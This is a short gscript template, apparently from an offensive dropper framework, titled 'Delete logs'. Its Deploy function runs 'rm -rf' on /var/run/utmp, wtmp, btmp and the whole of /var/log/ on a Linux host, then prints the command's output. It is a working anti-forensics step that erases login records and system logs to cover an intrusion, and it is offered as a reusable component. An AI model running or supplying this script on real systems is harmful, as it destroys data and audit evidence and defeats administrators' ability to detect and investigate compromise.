// Example gscript template
// Title: Delete logs
// Author: ahhh
// Purpose: deleting some logs on linux
// Gscript version: 1.0.0
// ATT&CK: 
// Tactic: Late pirority to run toward the end

//priority:200
//timeout:150

//go_import:github.com/gen0cide/gscript/stdlib/exec as exec

function Deploy() {
    //rm -rf /var/run/utmp /var/run/wtmp /var/run/btmp /var/log/
    var response = exec.ExecuteCommand("rm", ["-rf", "/var/run/utmp", "/var/run/wtmp", "/var/run/btmp", "/var/log/"]);
    console.log("Pid: "+response[0]);
    console.log("stdout: "+response[1]);
    console.log("stderr: "+response[2]);
    console.log("exit code: "+response[3]);
    console.log("go errors: "+Dump(response[4]));
    console.log("Removed /var/run/utmp, /var/run/wtmp, /var/run/btmp, and all of /var/log/");
}